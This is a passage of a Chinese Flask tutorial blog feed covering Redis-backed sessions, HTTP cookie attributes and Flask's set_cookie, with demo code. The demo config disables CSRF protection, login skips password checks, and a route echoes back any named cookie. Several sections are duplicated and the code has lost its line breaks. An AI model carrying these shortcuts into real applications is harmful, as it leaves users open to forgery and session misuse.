class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#  假设数据库验证通过, 添加 session</span>        user <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data        remember <span class="token operator">=</span> form<span class="token punctuation">.</span>remember<span class="token punctuation">.</span>data        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user        <span class="token keyword">print</span><span class="token punctuation">(</span>remember<span class="token punctuation">)</span>        <span class="token keyword">if</span> remember<span class="token punctuation">:</span>            session<span class="token punctuation">.</span>permanent <span class="token operator">=</span> <span class="token boolean">True</span>            app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'SESSION_COOKIE_LIFETIME'</span><span class="token punctuation">:</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            session<span class="token punctuation">.</span>permanent <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token string">'success'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-redisModel-py"><a href="#2-redisModel-py" class="headerlink" title="2.redisModel.py"></a>2.<code>redisModel.py</code></h4><blockquote><p>引入<code>redis</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> redis <span class="token keyword">import</span> StrictRedisredis <span class="token operator">=</span> StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-config-py-1"><a href="#3-config-py-1" class="headerlink" title="3.config.py"></a>3.<code>config.py</code></h4><blockquote><p>主要修改的是<code>config.py</code>,需要指定使用<code>redis</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">from</span> redisModel <span class="token keyword">import</span> redisDEBUG <span class="token operator">=</span> <span class="token boolean">True</span>TEMPLATES_AUTO_RELOAD <span class="token operator">=</span> <span class="token boolean">True</span><span class="token comment" spellcheck="true"># 显式关闭CSRF</span>WTF_CSRF_ENABLED <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true"># 指定Session保存类型</span>SESSION_TYPE <span class="token operator">=</span> <span class="token string">'redis'</span>SESSION_PERMANENT <span class="token operator">=</span> <span class="token boolean">False</span>SESSION_USE_SIGNER <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token comment" spellcheck="true"># 加密</span>SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 设定加密</span>SESSION_KEY_PREFIX<span class="token operator">=</span> <span class="token string">'session'</span>SESSION_REDIS <span class="token operator">=</span> redis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-运行验证"><a href="#4-运行验证" class="headerlink" title="4.运行验证"></a>4.运行验证</h4><blockquote><p>运行整个项目,访问<code>login.html</code>,然后查看<code>redis</code>中的内容.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-13/1602591731884-10311.png" alt="10311"></p><p>可以很明显的看到有以<code>session</code>开头的<code>key</code>,证明保存成功.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Flask Session </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask Cookie</title>
      <link href="/posts/16341.html"/>
      <url>/posts/16341.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600957445722-10298.png" alt="10298"></p><h2 id="HTTP-cookies"><a href="#HTTP-cookies" class="headerlink" title="HTTP cookies"></a>HTTP cookies</h2><h3 id="1-为什么会有cookie"><a href="#1-为什么会有cookie" class="headerlink" title="1.为什么会有cookie"></a>1.为什么会有<code>cookie</code></h3><blockquote><p><code>HTTP Cookies</code> 是服务器发送给用户浏览器并保存在本地的一小块数据,它会在浏览器下一次向同一服务器再次发送请求时被携带并发送给服务器.</p><p>它的作用是用来告诉服务器两个请求是否来自同一浏览器(如保持用户的登录状态).</p><p>这个原因是<code>HTTP</code> 协议本身是无状态的,它并不能区分管理请求和响应.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600957847043-10300.png" alt="10300"></p><ul><li>客户端通过<code>http</code> 协议去连接服务器,服务器并不记录是哪个客户端,<strong>服务器无法区分两次请求是来自同一浏览器还是多个浏览器</strong>,这也就意味着浏览器每打开一个标签页访问同一网站,都需要去验证用户名和密码.这显然是不可能的,因此<code>cookie</code> 技术诞生.</li></ul><p><code>Cookie</code> 具有以下特征:</p><ol><li>从 Web 服务器发向用户的浏览器</li><li>Cookie 中的数据是简单的纯文本,不是二进制.</li><li>Cookie 被浏览器存储在用户的电脑上(磁盘).</li><li>一个网站只能读取它自己的 Cookie,不能读其他网站甚至域名的.这个安全性由浏览器保证.</li><li>Cookie 不会在多个浏览器中共享,换句话说,一个浏览器不能读取存在其他浏览器Cookie,即使是同一域名的也不行.</li><li>根据 HTTP 协议,所有 Cookie 的大小不能超过 4KB.</li><li>Web 服务器发给客户端的 Cookie 数量是有限制的.这避免客户端过度消耗磁盘,每个域名大概 20-25 个 Cookie.</li></ol><p>它主要作用于以下方面:</p><ul><li>认证</li><li>追踪用户</li><li>个性化(主题,语言选择等)</li></ul></blockquote><h3 id="2-Cookie如何工作"><a href="#2-Cookie如何工作" class="headerlink" title="2.Cookie如何工作"></a>2.<code>Cookie</code>如何工作</h3><blockquote><p><code>Cookie</code> 最常用用于登录和登出操作.下面以<code>google</code>登陆为例来看实际中如如何登陆的:</p><ol><li>浏览器先向<code>www.google.com</code>的服务器发送一个<code>HTTP</code> 请求.通常是一个<code>POST</code> 请求,包含用户名和密码.</li><li>请求到达服务器后,服务器会验证用户的合法性.如果验证成功,服务器会给浏览器发送一个<code>Response with cookie</code>(通常是一个<code>GUID</code>或者任何服务器的唯一标识)<ul><li><code>Cookie</code>会放置在<code>Response head</code> 的<code>Set-Cookie</code> 字段中</li></ul></li><li>浏览器在收到<code>Response with cookie</code> 后,会把<code>Cookie</code>保存在磁盘中(和<code>Cookie</code>的过期时效有关)</li><li>此后,如果用户在同一浏览器中的新标签页访问<code>www.google.com</code>,浏览器会在<code>Response</code> 中自动带上<code>cookie</code></li><li><code>google.com</code>服务器在读到这个<code>cookie</code>时会验证它的合法性.服务器通常都会在内存里维护一个所有它生成的 <code>Cookie</code> 的字典.通常用<code>sessionID</code>为键,<code>UserID</code> 或者其他标识用户信息的内容作为值.</li><li>在认证完用户后,服务器就可以给用户发送自定义的动态页面.通常都包含该用户的特殊信息(如名字,头像,好友列表,活动订阅等等)</li></ol></blockquote><h3 id="3-创建Cookie"><a href="#3-创建Cookie" class="headerlink" title="3.创建Cookie"></a>3.创建<code>Cookie</code></h3><blockquote><ul><li><p>当服务器收到<code>HTTP</code>请求时,服务器可以在<code>Response</code> 的<code>Header</code> 中添加<code>Set-Cookie</code> 选项.</p></li><li><p>浏览器收到<code>Response with Cookie</code> 后,之后对服务器的每一次请求都通过<code>Cookie</code> 请求头部将<code>Cookie</code> 信息发送给服务器.</p></li><li><p>同时,<code>Cookie</code> 的过期时间,域,路径,有效期,适用站点都可以根据需要来指定.</p></li></ul></blockquote><h4 id="1-Set-Cookie"><a href="#1-Set-Cookie" class="headerlink" title="1.Set-Cookie"></a>1.<code>Set-Cookie</code></h4><blockquote><p>服务器使用<code>Set-Cookie</code> 来放置到<code>Response</code>信息中,一个简单的<code>Cookie</code> 类似如下:</p><pre class="line-numbers language-html">Set-Cookie:&lt;cookie 名字&gt;=&lt;cookie 值&gt;</code></pre><p>同时可以构造多个<code>Set-Cookie</code>:</p><pre><code class="html"><code class="language-html">Set-Cookie:&lt;cookie 名字&gt;=&lt;cookie 值&gt;</code></pre><p>同时可以构造多个<code>Set-Cookie</code>:</p><pre><code class="html">HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-Session-Cookie"><a href="#2-Session-Cookie" class="headerlink" title="2.Session Cookie"></a>2.<code>Session Cookie</code></h4><blockquote><p><code>Session Cookie</code>是最简单的<code>Cookie</code>:当浏览器关闭之后它会被自动删除,也就是说它仅仅在会话期间有效.</p><p><code>Session Cookie</code> 不需要指定过期时间(<code>Expires</code>)或者有效期(<code>Max-Age</code>).需要注意的是,有些浏览器提供了会话恢复功能(比如<code>chrome</code>) ,这种情况下即使关闭了浏览器,<code>Session Cookie</code>也会被保留.</p></blockquote><h4 id="3-持久性Cookie"><a href="#3-持久性Cookie" class="headerlink" title="3.持久性Cookie"></a>3.持久性<code>Cookie</code></h4><blockquote><p>指的是指定了过期时间(<code>Expires</code>)或者有效期(<code>Max-Age</code>)的<code>Cookie</code>.</p><pre class="line-numbers language-html">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></pre><p>注意:使用<code>Expires</code> 指定的过期时间是格林威治时间,需要用时区计算出自己所在时区的真正过期时间.(比如北京时间<code>+8</code>)</p></blockquote><h4 id="4-Cookie-的Secure和HttpOnly-标记"><a href="#4-Cookie-的Secure和HttpOnly-标记" class="headerlink" title="4.Cookie 的Secure和HttpOnly 标记"></a>4.<code>Cookie</code> 的<code>Secure</code>和<code>HttpOnly</code> 标记</h4><blockquote><p>标记为 <code>Secure</code> 的Cookie只应通过被<code>HTTPS</code>协议加密过的请求发送给服务端.但即便设置了 <code>Secure</code> 标记,敏感信息也不应该通过<code>Cookie</code>传输,因为<code>Cookie</code>有其固有的不安全性,<code>Secure</code>标记也无法提供确实的安全保障.</p><p>从 Chrome 52 和 Firefox 52 开始,不安全的站点<code>http:</code>无法使用Cookie的 <code>Secure</code> 标记.</p><p><code>HttpOnly</code>:如果服务器发送的<code>Cookie</code>不想被客户端的<code>JavaScript</code>调用,可以设置<code>HttpOnly</code> 标记.这样做是为了防止跨域脚本攻击(<code>XSS</code>).</p><pre><code class="html">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</code></pre></blockquote><h4 id="5-Cookie-的作用域"><a href="#5-Cookie-的作用域" class="headerlink" title="5.Cookie 的作用域"></a>5.<code>Cookie</code> 的作用域</h4><blockquote><p>和<code>Expires</code> 类似,还有<code>Domain</code>和<code>Path</code>指令用于对<code>Cookie</code> 指定作用域.</p><p><code>Domain</code>:指定了哪些主机可以接受<code>Cookie</code>,不指定默认是当前主机(比如<code>www.google.com</code>),不包含子域名.如果指定了<code>Domain</code>,则包含子域名.(比如指定<code>Domain=google.com</code>,<code>cookie</code>可以用于<code>gmail.google.com</code>子域名).</p><p><code>Path</code>:指定了主机下哪些路径可以接受<code>Cookie</code>(路径必须存在于请求URL中).以字符<code>%x2F</code> (“/“) 作为路径分隔符,子路径也会被匹配.例如,设置<code>Path=/docs</code>,则以下路径都会匹配.</p><ul><li><code>/docs</code></li><li><code>/docs/web/</code></li><li><code>/docs/web/http</code></li></ul></blockquote><h4 id="6-SameSite-Cookies"><a href="#6-SameSite-Cookies" class="headerlink" title="6.SameSite Cookies"></a>6.<code>SameSite Cookies</code></h4><blockquote><p>允许服务器要求某个<code>Cookie</code>在跨站请求中不会被发送,用来阻止伪造攻击(<code>CSRF</code>)</p></blockquote><h3 id="4-Cookie-的限制"><a href="#4-Cookie-的限制" class="headerlink" title="4.Cookie 的限制"></a>4.<code>Cookie</code> 的限制</h3><blockquote><ul><li>大小:每个最大<code>4K</code></li><li>数量:针对每个域名,<code>Cookie</code>的数量都有限制,这个限制是浏览器设置的,不是<code>HTTP</code>协议.</li><li>域名:服务器只能设置自己域名的<code>Cookie</code></li><li>访问:<code>HTTP Cookie</code> 可以被<code>JavaScript</code>读取.</li></ul></blockquote><h3 id="5-安全"><a href="#5-安全" class="headerlink" title="5.安全"></a>5.安全</h3><blockquote><p>由于<code>Cookie</code> 的特质,它存在着一些不安全的漏洞,当机器处于不安全环境时,切记<em>不能</em>通过HTTP Cookie存储,传输敏感信息.</p><p>针对<code>Cookie</code>主要有三种攻击:</p><ol><li>中间人攻击</li><li><code>XSS</code>跨站脚本攻击</li><li><code>CSRF</code> 跨站请求伪造攻击.</li></ol></blockquote><hr><h2 id="Flask-Cookie"><a href="#Flask-Cookie" class="headerlink" title="Flask Cookie"></a><code>Flask Cookie</code></h2><h3 id="1-Flask-Request"><a href="#1-Flask-Request" class="headerlink" title="1.Flask Request"></a>1.<code>Flask Request</code></h3><blockquote><p><code>HTTP</code> 的<code>Request</code> 的头部<code>Header</code> 中,包含了一个<code>Cookie</code>的属性.它包含了键值对和过期时间,路径和域等信息.</p><p>在<code>Flask</code> 中,<code>Cookie</code>设置在<code>Response</code> 类对象上.可以如下设置<code>cookie</code></p><ol><li>使用<code>make_response()</code> 函数从视图函数的返回值中获取响应对象.</li><li>使用响应对象的<code>set_cookie()</code>函数来存储<code>cookie</code>的基本信息(键值对,过期时间,路径,域)</li></ol><p>比如,新生成一个项目(参考代码:<a href="https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T17" target="_blank" rel="noopener">https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T17</a>):</p><pre><code class="bash"><code class="language-html">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></pre><p>注意:使用<code>Expires</code> 指定的过期时间是格林威治时间,需要用时区计算出自己所在时区的真正过期时间.(比如北京时间<code>+8</code>)</p></blockquote><h4 id="4-Cookie-的Secure和HttpOnly-标记"><a href="#4-Cookie-的Secure和HttpOnly-标记" class="headerlink" title="4.Cookie 的Secure和HttpOnly 标记"></a>4.<code>Cookie</code> 的<code>Secure</code>和<code>HttpOnly</code> 标记</h4><blockquote><p>标记为 <code>Secure</code> 的Cookie只应通过被<code>HTTPS</code>协议加密过的请求发送给服务端.但即便设置了 <code>Secure</code> 标记,敏感信息也不应该通过<code>Cookie</code>传输,因为<code>Cookie</code>有其固有的不安全性,<code>Secure</code>标记也无法提供确实的安全保障.</p><p>从 Chrome 52 和 Firefox 52 开始,不安全的站点<code>http:</code>无法使用Cookie的 <code>Secure</code> 标记.</p><p><code>HttpOnly</code>:如果服务器发送的<code>Cookie</code>不想被客户端的<code>JavaScript</code>调用,可以设置<code>HttpOnly</code> 标记.这样做是为了防止跨域脚本攻击(<code>XSS</code>).</p><pre><code class="html">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</code></pre></blockquote><h4 id="5-Cookie-的作用域"><a href="#5-Cookie-的作用域" class="headerlink" title="5.Cookie 的作用域"></a>5.<code>Cookie</code> 的作用域</h4><blockquote><p>和<code>Expires</code> 类似,还有<code>Domain</code>和<code>Path</code>指令用于对<code>Cookie</code> 指定作用域.</p><p><code>Domain</code>:指定了哪些主机可以接受<code>Cookie</code>,不指定默认是当前主机(比如<code>www.google.com</code>),不包含子域名.如果指定了<code>Domain</code>,则包含子域名.(比如指定<code>Domain=google.com</code>,<code>cookie</code>可以用于<code>gmail.google.com</code>子域名).</p><p><code>Path</code>:指定了主机下哪些路径可以接受<code>Cookie</code>(路径必须存在于请求URL中).以字符<code>%x2F</code> (“/“) 作为路径分隔符,子路径也会被匹配.例如,设置<code>Path=/docs</code>,则以下路径都会匹配.</p><ul><li><code>/docs</code></li><li><code>/docs/web/</code></li><li><code>/docs/web/http</code></li></ul></blockquote><h4 id="6-SameSite-Cookies"><a href="#6-SameSite-Cookies" class="headerlink" title="6.SameSite Cookies"></a>6.<code>SameSite Cookies</code></h4><blockquote><p>允许服务器要求某个<code>Cookie</code>在跨站请求中不会被发送,用来阻止伪造攻击(<code>CSRF</code>)</p></blockquote><h3 id="4-Cookie-的限制"><a href="#4-Cookie-的限制" class="headerlink" title="4.Cookie 的限制"></a>4.<code>Cookie</code> 的限制</h3><blockquote><ul><li>大小:每个最大<code>4K</code></li><li>数量:针对每个域名,<code>Cookie</code>的数量都有限制,这个限制是浏览器设置的,不是<code>HTTP</code>协议.</li><li>域名:服务器只能设置自己域名的<code>Cookie</code></li><li>访问:<code>HTTP Cookie</code> 可以被<code>JavaScript</code>读取.</li></ul></blockquote><h3 id="5-安全"><a href="#5-安全" class="headerlink" title="5.安全"></a>5.安全</h3><blockquote><p>由于<code>Cookie</code> 的特质,它存在着一些不安全的漏洞,当机器处于不安全环境时,切记<em>不能</em>通过HTTP Cookie存储,传输敏感信息.</p><p>针对<code>Cookie</code>主要有三种攻击:</p><ol><li>中间人攻击</li><li><code>XSS</code>跨站脚本攻击</li><li><code>CSRF</code> 跨站请求伪造攻击.</li></ol></blockquote><hr><h2 id="Flask-Cookie"><a href="#Flask-Cookie" class="headerlink" title="Flask Cookie"></a><code>Flask Cookie</code></h2><h3 id="1-Flask-Request"><a href="#1-Flask-Request" class="headerlink" title="1.Flask Request"></a>1.<code>Flask Request</code></h3><blockquote><p><code>HTTP</code> 的<code>Request</code> 的头部<code>Header</code> 中,包含了一个<code>Cookie</code>的属性.它包含了键值对和过期时间,路径和域等信息.</p><p>在<code>Flask</code> 中,<code>Cookie</code>设置在<code>Response</code> 类对象上.可以如下设置<code>cookie</code></p><ol><li>使用<code>make_response()</code> 函数从视图函数的返回值中获取响应对象.</li><li>使用响应对象的<code>set_cookie()</code>函数来存储<code>cookie</code>的基本信息(键值对,过期时间,路径,域)</li></ol><p>比如,新生成一个项目(参考代码:<a href="https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T17" target="_blank" rel="noopener">https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T17</a>):</p><pre><code class="bash">flask_cookie_demo1├── app.py├── static└── templates    ├── login.html    └── user.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>login.html</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>user.html</code></p><pre class="line-numbers language-html">&lt;p&gt;This is {{ username }}.&lt;a href=&quot;/getcookies/?name={{ username }}&quot;&gt;click me&lt;/a&gt;  &lt;/p&gt;</code></pre><p><code>app.py</code></p><pre><code class="python"><code class="language-html">&lt;p&gt;This is {{ username }}.&lt;a href=&quot;/getcookies/?name={{ username }}&quot;&gt;click me&lt;/a&gt;  &lt;/p&gt;</code></pre><p><code>app.py</code></p><pre><code class="python">from flask import Flaskfrom flask import make_responsefrom flask import render_template,requestfrom uuid import uuid4app = Flask(__name__)app.config.update({    'DEBUG':True,    'TEMPLATES_AUTO_RELOAD':True    })@app.route('/')def hello_world():    return 'Hello World!'@app.route('/login/',methods=['POST','GET'])def login():    if request.method == 'GET':            return render_template('login.html')    else:        name = request.form.get('name')        password = request.form.get('password')        # cookie是设置在 Response 响应对象上的,普通的字符串也是通过 response()方法返回的        # 如果要显式的返回,可以使用 make_response函数        # 假设用户为 ning,返回的应该是个性化窗口 ning.html        id = str(uuid4())        resp = make_response(render_template('user.html', username=name))        # 只设置 key,value 键值对        resp.set_cookie(name,id)        return resp@app.route('/getcookies/')def get_cookie():    name = request.args.get('name')    cookie1 = request.cookies.get(name)    print(name)    return cookie1if __name__ == '__main__':    app.run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里显式的返回了<code>Response</code> 对象,使用<code>make_response()</code>函数进行构造.并把<code>set_cookie</code> 传递到<code>Response</code> 信息中.存储的键值对是用户名和唯一的<code>uuid</code> .</p><p>使用浏览器访问<code>http://127.0.0.1:5000/login/</code> 提交后可以查看<code>cookie</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600958239251-10036.png" alt="10036">)</p><p>点击<code>click me</code> ,可以访问到<code>cookie</code> 的值.</p></blockquote><h4 id="2-set-cookie-方法"><a href="#2-set-cookie-方法" class="headerlink" title="2.set_cookie() 方法"></a>2.<code>set_cookie()</code> 方法</h4><blockquote><p><code>Flask</code> 中的<code>response</code> 对象都有<code>set_cookie()</code>方法,它可以设置<code>Cookie</code> 的基本信息.</p><pre class="line-numbers language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">set_cookie</span><span class="token punctuation">(</span>        self<span class="token punctuation">,</span>        key<span class="token punctuation">,</span>                 <span class="token comment" spellcheck="true"># cookie 的名称</span>        value<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span>       <span class="token comment" spellcheck="true"># cookie 的值</span>        max_age<span class="token operator">=</span>None<span class="token punctuation">,</span>         <span class="token comment" spellcheck="true"># 秒数,cookie在多少秒后时效</span>        expires<span class="token operator">=</span>None<span class="token punctuation">,</span>              <span class="token comment" spellcheck="true">#   datetime 对象, Unix时间戳</span>        path<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">,</span>                        <span class="token comment" spellcheck="true"># cookie 作用于网站的路径,默认为 全覆盖</span>        domain<span class="token operator">=</span>None<span class="token punctuation">,</span>             <span class="token comment" spellcheck="true">#  domain=''.example '',可以访问所有的子域名</span>        secure<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>                 <span class="token comment" spellcheck="true"># True,只能用https. False=>http</span>        httponly<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>             <span class="token comment" spellcheck="true"># 禁止 JavaScript 访问 Cookie</span>        samesite<span class="token operator">=</span>None<span class="token punctuation">,</span>         <span class="token comment" spellcheck="true"># 限制 cookie 的范围</span>    <span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-结合蓝图设置子域名"><a href="#3-结合蓝图设置子域名" class="headerlink" title="3.结合蓝图设置子域名"></a>3.结合蓝图设置子域名</h4><blockquote><p>参考代码:<a href="https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T18" target="_blank" rel="noopener">https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T18</a></p><p>主域名和子域名应该添加到<code>hosts</code> 文件中</p><pre class="line-numbers language-bash"><code class="language-bash">$ vim /etc/hosts192.168.0.110 kningyuan.club192.168.0.110 blog.kningyuan.club<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>生成如下项目目录</p><pre class="line-numbers language-bash"><code class="language-bash">flask_cookie_demo2├── app.py├── blueprint_model│   ├── blog.py│   ├── __init__.py├── static└── templates├── login.html└── user.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>login.html</code>和<code>user.html</code> 同上.</p><p><code>blog.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""设置蓝图子域名"""</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Blueprint<span class="token comment" spellcheck="true"># 实例化</span>bp <span class="token operator">=</span> Blueprint<span class="token punctuation">(</span><span class="token 